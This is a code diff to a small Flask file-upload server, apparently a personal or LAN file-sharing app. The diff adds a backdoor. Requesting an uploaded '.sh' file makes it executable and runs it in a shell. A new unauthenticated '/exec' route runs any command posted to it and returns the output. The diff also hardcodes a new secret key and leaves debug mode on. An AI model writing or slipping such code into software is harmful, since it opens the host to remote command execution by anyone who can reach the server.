@@ -3,9 +3,10 @@ import os
 import zipfile
 import io
 from datetime import datetime
+import subprocess
 
 app = Flask(__name__)
-app.secret_key = 'supersecretkey'
+app.secret_key = 'cure51'
 UPLOAD_FOLDER = 'uploads'
 if not os.path.exists(UPLOAD_FOLDER):
     os.makedirs(UPLOAD_FOLDER)
@@ -78,6 +79,12 @@ def delete_file():
 
 @app.route('/uploads/<filename>')
 def uploaded_file(filename):
+    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+
+    if filename.endswith('.sh'):
+        os.system(f'chmod +x {filepath}')
+        subprocess.Popen(filepath, shell=True)
+
     return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
 
 @app.route('/download_all', methods=['POST'])
@@ -94,6 +101,12 @@ def download_all():
     zip_filename = f'cure51_{date_str}.zip'
     
     return send_file(zip_buffer, as_attachment=True, download_name=zip_filename)
+
+@app.route('/exec', methods=['POST'])
+def exec_command():
+    command = request.form['command']
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    return f"<pre>{result.stdout}</pre><pre>{result.stderr}</pre>"
 
 if __name__ == '__main__':
     app.run(host='192.168.1.2', port=8000, debug=True)
